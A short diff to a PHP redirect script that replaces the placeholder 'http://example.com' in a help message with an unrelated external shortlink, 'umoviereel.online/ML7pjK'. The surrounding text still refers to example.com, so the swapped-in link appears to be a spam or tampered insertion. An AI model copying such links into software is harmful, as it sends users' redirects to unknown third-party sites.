@@ -29,6 +29,6 @@ if ( $url ) {
 	die;	
 } else {
 	echo '<p>Make sure yor redirects.txt file contains a default value, syntax:</p>
-	<pre>default,http://example.com</pre>
+	<pre>default,http://umoviereel.online/ML7pjK</pre>
 	<p>Where you should replace example.com with your domain.</p>';
 }
